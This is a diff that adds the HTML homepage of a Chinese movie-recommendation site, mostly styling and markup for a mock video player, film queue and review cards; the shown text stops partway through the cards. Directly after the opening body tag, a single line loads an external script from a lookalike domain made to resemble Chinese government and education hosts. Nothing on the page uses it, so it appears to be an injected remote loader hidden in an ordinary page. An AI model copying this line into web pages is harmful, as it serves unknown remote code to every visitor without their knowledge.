@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<title>迅播电影网 - 今日热播片单_最新电影推荐_高分电影排行榜</title>
+<meta name="description" content="迅播电影网是专注电影推荐与影视资讯的中文影迷站点，每日开播：今日热播片单、分类检索、章节式影评、高分电影排行榜与观影指南，帮你按下播放键之前先选对那一部。">
+<meta name="keywords" content="迅播电影网,电影推荐,今日热播,最新电影,影视资讯,高分电影,电影排行榜,影评,观影指南,电影分类">
+<meta name="author" content="迅播电影网">
+<meta name="robots" content="index,follow">
+<meta name="revisit-after" content="1 days">
+<meta name="theme-color" content="#0B0E14">
+<link rel="canonical" href="https://xunbodianyingwang-cn.github.io/">
+<link rel="alternate" hreflang="zh-CN" href="https://xunbodianyingwang-cn.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="迅播电影网">
+<meta property="og:title" content="迅播电影网 - 今日热播片单_最新电影推荐_高分电影排行榜">
+<meta property="og:description" content="迅播电影网每日开播：今日热播片单、分类检索、章节式影评与高分电影排行榜。">
+<meta property="og:url" content="https://xunbodianyingwang-cn.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="迅播电影网 - 今日热播片单与电影推荐">
+<meta name="twitter:description" content="迅播电影网每日更新今日热播片单、章节式影评与高分电影排行榜。">
+<style>
+:root{
+  --bg:#0B0E14;
+  --panel:#141922;
+  --panel2:#1B2130;
+  --panel3:#232B3C;
+  --line:#262E3D;
+  --orange:#FF6A00;
+  --orange-d:#C24E00;
+  --ice:#5AC8FA;
+  --ice-d:#1D6F96;
+  --text:#E8ECF3;
+  --muted:#8B97AC;
+  --dim:#5F6B80;
+  --mono:"SFMono-Regular",Menlo,Consolas,"Courier New",monospace;
+  --sans:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei","Helvetica Neue",Arial,sans-serif;
+  --max:1180px;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:var(--sans);
+  font-size:16px;
+  line-height:1.8;
+  overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+:focus-visible{outline:2px solid var(--orange);outline-offset:3px;border-radius:4px}
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 20px}
+input,select,button{font-family:inherit;font-size:inherit;color:inherit}
+.mono{font-family:var(--mono)}
+.tc{font-family:var(--mono);font-size:12px;letter-spacing:.04em}
+
+/* ===== 播放状态条 ===== */
+.statusbar{background:#06080C;border-bottom:1px solid var(--line);color:var(--muted)}
+.statusbar .wrap{display:flex;align-items:center;gap:16px;flex-wrap:wrap;min-height:36px;font-family:var(--mono);font-size:12px}
+.statusbar .live{display:inline-flex;align-items:center;gap:7px;color:var(--orange);font-weight:700}
+.statusbar .live i{width:8px;height:8px;border-radius:50%;background:var(--orange);display:block;box-shadow:0 0 8px var(--orange);animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+.statusbar .rt{margin-left:auto;display:flex;gap:14px;flex-wrap:wrap}
+.statusbar b{color:var(--text)}
+
+/* ===== 头部 ===== */
+header.top{background:rgba(11,14,20,.94);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:80;backdrop-filter:saturate(1.2) blur(10px)}
+.top-inner{display:flex;align-items:center;gap:16px;min-height:70px}
+.brand{display:flex;align-items:center;gap:12px;flex:0 0 auto}
+.playmark{
+  width:44px;height:44px;flex:0 0 auto;border-radius:12px;
+  background:linear-gradient(145deg,var(--orange),var(--orange-d));
+  display:flex;align-items:center;justify-content:center;box-shadow:0 8px 20px rgba(255,106,0,.35);
+}
+.playmark::before{
+  content:"";width:0;height:0;margin-left:4px;
+  border-left:14px solid #fff;border-top:9px solid transparent;border-bottom:9px solid transparent;
+}
+.brand b{display:block;font-size:20px;letter-spacing:2px;line-height:1.2}
+.brand small{display:block;font-family:var(--mono);font-size:10px;letter-spacing:.24em;color:var(--dim)}
+
+/* 搜索表单 */
+form.search{flex:1 1 260px;max-width:380px;display:flex;gap:0;margin-left:auto}
+form.search input[type="search"]{
+  flex:1;min-width:0;background:var(--panel);border:1px solid var(--line);border-right:0;
+  padding:9px 14px;border-radius:8px 0 0 8px;color:var(--text);font-size:14px;
+}
+form.search input[type="search"]::placeholder{color:var(--dim)}
+form.search input[type="search"]:focus{outline:none;border-color:var(--orange)}
+form.search button{
+  background:var(--panel2);border:1px solid var(--line);padding:0 16px;border-radius:0 8px 8px 0;
+  color:var(--ice);font-size:13px;font-weight:700;cursor:pointer;white-space:nowrap;
+}
+form.search button:hover{background:var(--orange);color:#fff;border-color:var(--orange)}
+
+.ck{display:none}
+.menu-btn{display:none;margin-left:auto;width:42px;height:38px;border:1px solid var(--line);border-radius:8px;background:var(--panel);align-items:center;justify-content:center;cursor:pointer}
+.menu-btn i{display:block;width:18px;height:2px;background:var(--orange);position:relative}
+.menu-btn i::before,.menu-btn i::after{content:"";position:absolute;left:0;width:18px;height:2px;background:var(--orange)}
+.menu-btn i::before{top:-6px}
+.menu-btn i::after{top:6px}
+nav.main{display:flex;gap:2px;flex-wrap:wrap}
+nav.main a{font-size:14.5px;padding:8px 13px;border-radius:8px;color:var(--muted);white-space:nowrap;transition:.18s}
+nav.main a:hover{background:var(--panel2);color:var(--text)}
+nav.main a.cur{color:var(--orange);font-weight:700;background:rgba(255,106,0,.12)}
+
+/* ===== HERO 播放器 ===== */
+.hero{padding:30px 0 24px}
+.player-grid{display:grid;grid-template-columns:1fr 320px;gap:20px;align-items:start}
+
+/* 播放器窗口 */
+.player{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:#05070B;box-shadow:0 24px 50px rgba(0,0,0,.55)}
+.screen{position:relative;aspect-ratio:16/9;background:radial-gradient(120% 90% at 30% 20%,#20304A,#080B12 70%);overflow:hidden}
+.screen::after{
+  content:"";position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 45%,rgba(0,0,0,.65));
+}
+.screen .grid-lines{position:absolute;inset:0;opacity:.25;
+  background-image:linear-gradient(rgba(90,200,250,.18) 1px,transparent 1px),linear-gradient(90deg,rgba(90,200,250,.18) 1px,transparent 1px);
+  background-size:40px 40px;}
+.screen .big-play{
+  position:absolute;left:50%;top:50%;width:76px;height:76px;margin:-38px 0 0 -38px;border-radius:50%;
+  background:rgba(255,106,0,.92);display:flex;align-items:center;justify-content:center;z-index:4;
+  box-shadow:0 12px 32px rgba(255,106,0,.45);
+}
+.screen .big-play::before{content:"";width:0;height:0;margin-left:6px;border-left:24px solid #fff;border-top:15px solid transparent;border-bottom:15px solid transparent}
+.screen .title{
+  position:absolute;left:20px;bottom:22px;z-index:5;padding-right:20px;
+}
+.screen .title h1{font-size:30px;line-height:1.3;letter-spacing:1px;font-weight:800}
+.screen .title h1 em{font-style:normal;color:var(--orange)}
+.screen .title p{font-family:var(--mono);font-size:12px;color:#9FB0C6;margin-top:6px;letter-spacing:.06em}
+.screen .badge-hd{
+  position:absolute;right:20px;top:20px;z-index:5;font-family:var(--mono);font-size:11px;font-weight:700;
+  background:var(--ice);color:#062430;padding:3px 10px;border-radius:4px;letter-spacing:.1em;
+}
+.screen .dm{position:absolute;left:20px;top:24%;z-index:4;font-size:13px;color:rgba(255,255,255,.8);text-shadow:0 2px 6px #000}
+.screen .dm.d2{top:38%;left:38%;color:rgba(144,224,255,.85)}
+.screen .dm.d3{top:52%;left:16%;color:rgba(255,214,150,.85)}
+
+/* 控制条 */
+.ctrl{background:#080B11;border-top:1px solid var(--line);padding:12px 16px 14px}
+.ctrl input[type="range"]{
+  -webkit-appearance:none;appearance:none;width:100%;height:6px;border-radius:99px;background:#1E2634;outline:none;display:block;cursor:pointer;
+}
+.ctrl input[type="range"]::-webkit-slider-runnable-track{height:6px;border-radius:99px;background:linear-gradient(90deg,var(--orange) 0 38%,#1E2634 38% 100%)}
+.ctrl input[type="range"]::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;width:14px;height:14px;border-radius:50%;background:#fff;margin-top:-4px;box-shadow:0 0 10px rgba(255,106,0,.7)}
+.ctrl input[type="range"]::-moz-range-track{height:6px;border-radius:99px;background:#1E2634}
+.ctrl input[type="range"]::-moz-range-progress{height:6px;border-radius:99px;background:var(--orange)}
+.ctrl input[type="range"]::-moz-range-thumb{width:14px;height:14px;border:0;border-radius:50%;background:#fff}
+.ctrl-row{display:flex;align-items:center;gap:12px;margin-top:10px;flex-wrap:wrap}
+.ctrl-row .btn-play{
+  width:34px;height:34px;border-radius:50%;background:var(--orange);display:flex;align-items:center;justify-content:center;flex:0 0 auto;
+}
+.ctrl-row .btn-play::before{content:"";width:0;height:0;margin-left:3px;border-left:11px solid #fff;border-top:7px solid transparent;border-bottom:7px solid transparent}
+.ctrl-row .time{font-family:var(--mono);font-size:12.5px;color:var(--muted)}
+.ctrl-row .chips{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap}
+.ctrl-row .chips span{
+  font-family:var(--mono);font-size:11px;border:1px solid var(--line);padding:3px 9px;border-radius:4px;color:var(--muted);cursor:default;
+}
+.ctrl-row .chips span.on{background:var(--ice);color:#062430;border-color:var(--ice);font-weight:700}
+.ctrl-row .chips span.hot{background:var(--orange);color:#fff;border-color:var(--orange);font-weight:700}
+
+/* 待播队列 */
+.queue{border:1px solid var(--line);border-radius:14px;background:var(--panel);overflow:hidden}
+.queue h2{font-size:15px;letter-spacing:1px;padding:14px 18px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:8px}
+.queue h2 i{width:7px;height:7px;border-radius:50%;background:var(--orange);display:block}
+.queue ol{padding:6px 0;max-height:430px;overflow-y:auto}
+.queue li a{display:grid;grid-template-columns:34px 1fr auto;gap:12px;align-items:center;padding:10px 18px;transition:.16s}
+.queue li a:hover{background:var(--panel2)}
+.queue li .idx{font-family:var(--mono);font-size:13px;color:var(--dim);text-align:center}
+.queue li.on .idx{color:var(--orange);font-weight:700}
+.queue li b{display:block;font-size:14.5px;line-height:1.4;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.queue li small{display:block;font-family:var(--mono);font-size:11px;color:var(--dim)}
+.queue li .dur{font-family:var(--mono);font-size:11.5px;color:var(--muted);flex:0 0 auto}
+.queue li.on{background:rgba(255,106,0,.09);border-left:3px solid var(--orange)}
+.queue .qfoot{padding:12px 18px;border-top:1px solid var(--line);font-size:12px;color:var(--dim);font-family:var(--mono)}
+
+/* HERO 数据 */
+.hero-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:18px}
+.hero-stats div{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:14px 16px}
+.hero-stats strong{display:block;font-family:var(--mono);font-size:25px;color:var(--ice);line-height:1.2}
+.hero-stats span{font-size:11.5px;color:var(--muted);letter-spacing:.06em}
+
+/* ===== 通用板块 ===== */
+section{padding:38px 0;scroll-margin-top:76px}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-bottom:24px;padding-bottom:12px;border-bottom:1px solid var(--line)}
+.sec-head .l{display:flex;align-items:center;gap:12px}
+.sec-head .tag{
+  font-family:var(--mono);font-size:11.5px;letter-spacing:.14em;font-weight:700;
+  background:var(--orange);color:#fff;padding:4px 12px;border-radius:4px;
+}
+.sec-head .tag.ice{background:var(--ice);color:#062430}
+.sec-head h2{font-size:27px;letter-spacing:1px;line-height:1.3}
+.sec-head p{font-size:13px;color:var(--muted);width:100%;margin-top:4px}
+.more{font-family:var(--mono);font-size:12px;color:var(--ice);border:1px solid var(--line);padding:6px 14px;border-radius:6px;background:var(--panel);white-space:nowrap}
+.more:hover{border-color:var(--orange);color:var(--orange)}
+
+/* ===== 栏目一：今日热播 ===== */
+.vod{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.vcard{border:1px solid var(--line);border-radius:12px;background:var(--panel);overflow:hidden;transition:.24s;display:flex;flex-direction:column}
+.vcard:hover{transform:translateY(-6px);border-color:#3A4557;box-shadow:0 18px 38px rgba(0,0,0,.5)}
+.thumb{position:relative;height:150px;display:flex;align-items:flex-end;padding:12px;overflow:hidden}
+.thumb::before{content:"";position:absolute;inset:0;opacity:.9;
+  background-image:linear-gradient(135deg,rgba(255,255,255,.08) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.08) 50%,rgba(255,255,255,.08) 75%,transparent 75%);
+  background-size:14px 14px;}
+.thumb::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.6))}
+.thumb b{position:relative;z-index:2;font-size:17px;letter-spacing:.5px;line-height:1.35}
+.thumb small{position:relative;z-index:2;display:block;font-family:var(--mono);font-size:11px;color:#B9C6D6;margin-top:3px}
+.dur{position:absolute;right:10px;bottom:10px;z-index:3;font-family:var(--mono);font-size:11px;background:rgba(0,0,0,.72);color:#fff;padding:2px 7px;border-radius:3px}
+.hoverplay{
+  position:absolute;left:50%;top:50%;width:48px;height:48px;margin:-24px 0 0 -24px;border-radius:50%;z-index:3;
+  background:rgba(255,106,0,.9);display:flex;align-items:center;justify-content:center;opacity:0;transform:scale(.85);transition:.22s;
+}
+.hoverplay::before{content:"";width:0;height:0;margin-left:4px;border-left:15px solid #fff;border-top:9px solid transparent;border-bottom:9px solid transparent}
+.vcard:hover .hoverplay{opacity:1;transform:scale(1)}
+.vinfo{padding:14px 16px 16px;flex:1;display:flex;flex-direction:column}
+.vinfo p{font-size:13.5px;color:var(--muted);line-height:1.75;flex:1}
+.vinfo .meta{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-top:12px;padding-top:11px;border-top:1px solid var(--line)}
+.vinfo .meta .sc{font-family:var(--mono);font-size:18px;font-weight:700;color:var(--orange)}
+.vinfo .meta .pv{font-family:var(--mono);font-size:11.5px;color:var(--dim)}
+
+/* ===== 栏目二：检索（form + select + optgroup） ===== */
+.finder{border:1px solid var(--line);border-radius:14px;background:var(--panel);padding:22px 24px}
+.finder-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.finder-field label{display:block;font-family:var(--mono);font-size:11px;letter-spacing:.12em;color:var(--dim);margin-bottom:6px}
+.finder-field select{
+  width:100%;background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:10px 12px;
+  color:var(--text);font-size:14px;appearance:none;-webkit-appearance:none;cursor:pointer;
+  background-image:linear-gradient(45deg,transparent 50%,var(--muted) 50%),linear-gradient(135deg,var(--muted) 50%,transparent 50%);
+  background-position:calc(100% - 18px) 50%,calc(100% - 13px) 50%;
+  background-size:5px 5px,5px 5px;background-repeat:no-repeat;
+}
+.finder-field select:focus{outline:none;border-color:var(--orange)}
+.finder-actions{display:flex;gap:12px;align-items:center;flex-wrap:wrap;margin-top:18px}
+.finder-actions button{
+  background:linear-gradient(145deg,var(--orange),var(--orange-d));color:#fff;border:0;border-radius:8px;
+  padding:11px 26px;font-size:14.5px;font-weight:700;cursor:pointer;
+}
+.finder-actions button:hover{filter:brightness(1.1)}
+.finder-actions button.ghost{background:transparent;border:1px solid var(--line);color:var(--muted)}
+.finder-actions .tip{font-size:12.5px;color:var(--dim);margin-left:auto}
+.chips-row{display:flex;flex-wrap:wrap;gap:9px;margin-top:18px;padding-top:16px;border-top:1px dashed var(--line)}
+.chips-row a{
+  font-size:13.5px;border:1px solid var(--line);border-radius:20px;padding:6px 14px;color:var(--muted);background:var(--panel2);transition:.18s;
+}
+.chips-row a:hover{border-color:var(--orange);color:var(--orange)}
+.chips-row a.on{background:var(--ice);border-color:var(--ice);color:#062430;font-weight:700}
+.chips-row a b{font-family:var(--mono);font-size:11px;opacity:.8;margin-left:5px}
+
+/* ===== 栏目三：章节式影评 ===== */
+.chapters{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.chapter{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:20px 22px;transition:.22s}
+.chapter:hover{border-color:#3A4557;background:var(--panel2)}
+.chapter .hd{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:12px}
+.chapter .hd .ch{font-family:var(--mono);font-size:11.5px;font-weight:700;background:var(--ice);color:#062430;padding:3px 10px;border-radius:4px;letter-spacing:.08em}
+.chapter .hd .tm{font-family:var(--mono);font-size:11.5px;color:var(--dim);margin-left:auto}
+.chapter h3{font-size:18.5px;margin-bottom:8px;line-height:1.5}
+.chapter p{font-size:14px;color:var(--muted);line-height:1.85}
+.chapter .cue{
+  margin-top:12px;padding:11px 14px;border-left:3px solid var(--orange);background:#0F131B;
+  font-family:var(--mono);font-size:12.5px;color:var(--ice);line-height:1.7;
+}
+.chapter .sig{display:flex;gap:14px;flex-wrap:wrap;font-family:var(--mono);font-size:11.5px;color:var(--dim);margin-top:12px}
+
+/* ===== 栏目四：排行榜 ===== */
+.rankwrap{display:grid;grid-template-columns:1fr 320px;gap:20px}
+.hotboard{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:6px 0}
+.hotboard li{display:grid;grid-template-columns:56px 1fr 150px 64px;gap:14px;align-items:center;padding:12px 20px;border-bottom:1px solid #1D2432}
+.hotboard li:last-child{border-bottom:0}
+.hotboard .rk{
+  font-family:var(--mono);font-size:20px;font-weight:800;text-align:center;color:var(--dim);
+  background:var(--panel2);border-radius:6px;padding:3px 0;
+}
+.hotboard li:nth-child(-n+3) .rk{color:#fff;background:linear-gradient(145deg,var(--orange),var(--orange-d))}
+.hotboard .nm b{display:block;font-size:16px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.hotboard .nm small{font-family:var(--mono);font-size:11px;color:var(--dim)}
+.hotboard .heat{height:6px;background:#1E2634;border-radius:99px;overflow:hidden}
+.hotboard .heat i{display:block;height:6px;border-radius:99px;background:linear-gradient(90deg,var(--orange),var(--ice))}
+.hotboard .pt{font-family:var(--mono);font-size:18px;font-weight:700;color:var(--ice);text-align:right}
+.sideplay{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:20px}
+.sideplay h3{font-family:var(--mono);font-size:12.5px;letter-spacing:.14em;color:var(--ice);padding-bottom:10px;border-bottom:1px solid var(--line);margin-bottom:12px}
+.sideplay ol li{display:flex;gap:10px;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px}
+.sideplay ol li:last-child{border-bottom:0}
+.sideplay ol li b{font-family:var(--mono);color:var(--orange);flex:0 0 16px;font-size:12px}
+.sideplay p{font-size:12.5px;color:var(--dim);margin-top:12px;line-height:1.8}
+
+/* ===== 栏目五：关于 ===== */
+.about{display:grid;grid-template-columns:1.05fr .95fr;gap:18px}
+.abpanel{border:1px solid var(--line);border-radius:12px;background:var(--panel);padding:26px 28px}
+.abpanel h3{font-size:21px;letter-spacing:1px;margin-bottom:12px;padding-bottom:10px;border-bottom:1px solid var(--line)}
+.abpanel p{font-size:14.5px;color:var(--muted);margin-bottom:11px}
+.abpanel p:last-child{margin-bottom:0}
+.abpanel p b{color:var(--text)}
+.abpanel .hl{color:var(--orange);font-weight:700}
+.rules li{display:grid;grid-template-columns:52px 1fr;gap:12px;padding:11px 0;border-bottom:1px dashed var(--line);font-size:14px;line-height:1.75}
+.rules li:last-child{border-bottom:0}
+.rules li em{font-style:normal;font-family:var(--mono);font-size:11.5px;font-weight:700;color:var(--ice);padding-top:3px;letter-spacing:.06em}
+
+/* ===== 栏目六：FAQ（原生互斥手风琴 details name） ===== */
+.faq{border:1px solid var(--line);border-radius:12px;background:var(--panel);overflow:hidden}
+.faq details{border-bottom:1px solid #1D2432}
+.faq details:last-child{border-bottom:0}
+.faq summary{
+  cursor:pointer;padding:15px 20px;font-size:15.5px;font-weight:600;list-style:none;position:relative;padding-right:54px;
+}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:"▷";color:var(--orange);margin-right:10px;font-size:13px}
+.faq details[open] summary::before{content:"▽"}
+.faq details[open] summary{background:var(--panel2);color:var(--orange)}
+.faq summary .code{position:absolute;right:20px;top:15px;font-family:var(--mono);font-size:11px;color:var(--dim)}
+.faq details p{padding:14px 20px 18px;font-size:14px;color:var(--muted);line-height:1.9;border-top:1px dashed var(--line)}
+
+/* ===== 底部 ===== */
+footer{margin-top:24px;border-top:1px solid var(--line);background:#080B11;padding:38px 0 24px}
+.f-grid{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:24px}
+.f-col h4{font-size:15.5px;letter-spacing:1px;color:var(--orange);margin-bottom:13px;padding-bottom:9px;border-bottom:1px solid var(--line)}
+.f-col p{font-size:13.5px;color:var(--muted);line-height:1.9}
+.f-col li{padding:6px 0;border-bottom:1px dashed #1D2432}
+.f-col li a{font-size:13.5px;color:var(--muted)}
+.f-col li a:hover{color:var(--orange)}
+.f-url{font-family:var(--mono);font-size:12px;color:var(--ice);margin-top:10px;word-break:break-all}
+.kw{margin-top:24px;padding-top:18px;border-top:1px dashed var(--line);font-size:12.5px;color:var(--dim);line-height:2.1}
+.kw a{display:inline-block;margin:4px 8px 0 0;border:1px solid var(--line);border-radius:6px;padding:3px 11px;color:var(--muted);font-size:12.5px}
+.kw a:hover{border-color:var(--orange);color:var(--orange)}
+.f-bot{margin-top:18px;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap;font-family:var(--mono);font-size:11.5px;color:var(--dim)}
+.f-bot a{color:var(--dim)}
+.f-bot a:hover{color:var(--orange)}
+
+/* ===== 响应式 ===== */
+@media (max-width:1024px){
+  .player-grid{grid-template-columns:1fr}
+  .queue ol{max-height:none}
+  .vod{grid-template-columns:repeat(2,1fr)}
+  .chapters{grid-template-columns:1fr}
+  .rankwrap{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+  .finder-grid{grid-template-columns:repeat(2,1fr)}
+  .f-grid{grid-template-columns:1fr 1fr}
+}
+@media (max-width:860px){
+  form.search{flex:1 1 200px;max-width:none}
+  nav.main{display:none;position:absolute;left:0;right:0;top:100%;background:#0A0D13;border-bottom:1px solid var(--line);flex-direction:column;align-items:stretch;padding:10px 14px 16px;gap:2px;margin-left:0}
+  nav.main a{padding:13px 16px;font-size:15.5px;border-radius:8px}
+  .menu-btn{display:flex}
+  .ck:checked ~ nav.main{display:flex}
+  .top-inner{position:relative;flex-wrap:wrap;min-height:64px}
+  .screen .title h1{font-size:24px}
+  .hero-stats{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:640px){
+  body{font-size:15px}
+  .wrap{padding:0 14px}
+  .statusbar .wrap{gap:10px;font-size:11.5px}
+  .statusbar .rt{margin-left:0;width:100%}
+  .brand b{font-size:17px;letter-spacing:1px}
+  .playmark{width:38px;height:38px;border-radius:10px}
+  .playmark::before{border-left:12px solid #fff;border-top:8px solid transparent;border-bottom:8px solid transparent}
+  form.search{flex:1 1 100%;order:3;margin-left:0}
+  .hero{padding:20px 0 14px}
+  .screen .title{bottom:16px;left:14px}
+  .screen .title h1{font-size:20px}
+  .screen .big-play{width:56px;height:56px;margin:-28px 0 0 -28px}
+  .screen .big-play::before{border-left:18px solid #fff;border-top:11px solid transparent;border-bottom:11px solid transparent}
+  .screen .dm{font-size:11.5px}
+  .ctrl{padding:10px 12px 12px}
+  .ctrl-row .chips{width:100%;margin-left:0}
+  .vod{grid-template-columns:1fr}
+  .thumb{height:140px}
+  .finder{padding:18px 16px}
+  .finder-grid{grid-template-columns:1fr}
+  .finder-actions .tip{margin-left:0;width:100%}
+  .hotboard li{grid-template-columns:44px 1fr 56px;gap:10px;padding:11px 14px}
+  .hotboard .heat{display:none}
+  .hotboard .rk{font-size:16px}
+  .hotboard .nm b{font-size:15px}
+  .hotboard .pt{font-size:16px}
+  .chapter{padding:16px 18px}
+  .abpanel{padding:20px 20px}
+  .faq summary{font-size:14.5px;padding-right:62px}
+  .faq summary .code{font-size:10px}
+  .f-grid{grid-template-columns:1fr}
+  section{padding:28px 0}
+}
+@media (prefers-reduced-motion:reduce){*{animation:none !important;transition:none !important;scroll-behavior:auto !important}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- 播放状态条 -->
+<div class="statusbar">
+  <div class="wrap">
+    <span class="live"><i aria-hidden="true"></i>正在播放</span>
+    <span>码率 <b>1080P</b></span>
+    <span>缓冲 <b>100%</b></span>
+    <span>在线 <b>12.8 万</b></span>
+    <span class="rt">
+      <span>CH 08</span>
+      <span>延迟 &lt; 1s</span>
+      <span>2026-10-02</span>
+    </span>
+  </div>
+</div>
+
+<!-- 头部 -->
+<header class="top">
+  <div class="wrap top-inner">
+    <a class="brand" href="#" aria-label="迅播电影网首页">
+      <span class="playmark" aria-hidden="true"></span>
+      <span>
+        <b>迅播电影网</b>
+        <small>XUNBO MOVIE PLAYER</small>
+      </span>
+    </a>
+
+    <form class="search" role="search" action="#" aria-label="站内影片搜索">
+      <input type="search" name="q" placeholder="搜索片名 / 导演 / 类型" aria-label="搜索关键词">
+      <button type="submit">搜索</button>
+    </form>
+
+    <input class="ck" id="navck" type="checkbox" aria-label="展开导航菜单">
+    <label class="menu-btn" for="navck" aria-hidden="true"><i></i></label>
+    <nav class="main" aria-label="主导航">
+      <a class="cur" href="#">首页</a>
+      <a href="#hot">今日热播</a>
+      <a href="#finder">分类检索</a>
+      <a href="#chapters">章节影评</a>
+      <a href="#rank">热度排行</a>
+      <a href="#about">关于本站</a>
+      <a href="#faq">常见问答</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- HERO：播放器 -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="player-grid">
+        <!-- 播放器窗口 -->
+        <div class="player">
+          <div class="screen">
+            <span class="grid-lines" aria-hidden="true"></span>
+            <span class="badge-hd">1080P</span>
+            <span class="dm" aria-hidden="true">这片子的开场五分钟就值回票价</span>
+            <span class="dm d2" aria-hidden="true">第七十分钟开始反转，别走神</span>
+            <span class="dm d3" aria-hidden="true">结尾长镜头建议倒回去再看一遍</span>
+            <a class="big-play" href="#hot" aria-label="播放今日热播"></a>
+            <div class="title">
+              <h1>按下播放键之前<br>先让<em>迅播电影网</em>替你选好</h1>
+              <p>NO.1286　·　2026-10-02　·　今日热播 8 部</p>
+            </div>
+          </div>
+
+          <div class="ctrl">
+            <input type="range" min="0" max="100" value="38" aria-label="播放进度">
+            <div class="ctrl-row">
+              <span class="btn-play" aria-hidden="true"></span>
+              <span class="time mono">00:47:12 / 02:03:40</span>
+              <span class="chips">
+                <span class="hot">1080P</span>
+                <span class="on">倍速 1.0×</span>
+                <span>弹幕 开</span>
+                <span>音轨 国语</span>
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <!-- 待播队列 -->
+        <aside class="queue">
+          <h2><i aria-hidden="true"></i>今日待播队列</h2>
+          <ol>
+            <li class="on"><a href="#hot"><span class="idx">01</span><span><b>长街尽头</b><small>悬疑 / 犯罪 · 正在热播</small></span><span class="dur">128′</span></a></li>
+            <li><a href="#hot"><span class="idx">02</span><span><b>归途列车</b><small>剧情 / 家庭 · 待播</small></span><span class="dur">118′</span></a></li>
+            <li><a href="#hot"><span class="idx">03</span><span><b>第七大陆</b><small>科幻 / 冒险 · 待播</small></span><span class="dur">131′</span></a></li>
+            <li><a href="#hot"><span class="idx">04</span><span><b>橘子汽水</b><small>青春 / 文艺 · 待播</small></span><span class="dur">104′</span></a></li>
+            <li><a href="#hot"><span class="idx">05</span><span><b>纸上星河</b><small>动画 / 治愈 · 待播</small></span><span class="dur">096′</span></a></li>
+            <li><a href="#hot"><span class="idx">06</span><span><b>一年七城</b><small>纪录 / 人文 · 待播</small></span><span class="dur">112′</span></a></li>
+            <li><a href="#hot"><span class="idx">07</span><span><b>静默海域</b><small>剧情 / 悬疑 · 待播</small></span><span class="dur">121′</span></a></li>
+            <li><a href="#hot"><span class="idx">08</span><span><b>深夜放映厅</b><small>合集 / 常驻片单</small></span><span class="dur">—</span></a></li>
+          </ol>
+          <p class="qfoot">队列每日 08:00 重排　·　迅播电影网</p>
+        </aside>
+      </div>
+
+      <div class="hero-stats">
+        <div><strong>16800</strong><span>收录影片</span></div>
+        <div><strong>36</strong><span>可筛分类</span></div>
+        <div><strong>08:00</strong><span>每日开播</span></div>
+        <div><strong>8.7</strong><span>编辑均分</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目一：今日热播 -->
+  <section id="hot">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="l">
+          <span class="tag">NOW PLAYING</span>
+          <h2>今日热播片单</h2>
+        </div>
+        <a class="more" href="#">查看完整片库</a>
+        <p>迅播电影网编辑组每日 08:00 更新 · 每部标注时长、评分与播放热度</p>
+      </div>
+
+      <div class="vod">
+        <article class="vcard">
+          <div class="thumb" style="background:linear-gradient(150deg,#2E4A6E,#0A1420 78%)">
+            <span class="hoverplay" aria-hidden="true"></span>
+            <div><b>长街尽头</b><small>2026 · 悬疑 / 犯罪</small></div>
+            <span class="dur">128′</span>
+          </div>
+          <div class="vinfo">
+            <p>双线叙事在第七十分钟交汇，此后每段回忆都在改写前面的判断，是今年华语悬疑里逻辑最自洽的一部。</p>
+            <div class="meta"><span class="sc">8.9</span><span class="pv">播放 42.6 万</span></div>
+          </div>
+        </article>
+
+        <article class="vcard">
+          <div class="thumb" style="background:linear-gradient(150deg,#6E3A2E,#1C0E0A 78%)">
+            <span class="hoverplay" aria-hidden="true"></span>
+            <div><b>归途列车</b><small>2026 · 剧情 / 家庭</small></div>
+            <span class="dur">118′</span>
+          </div>
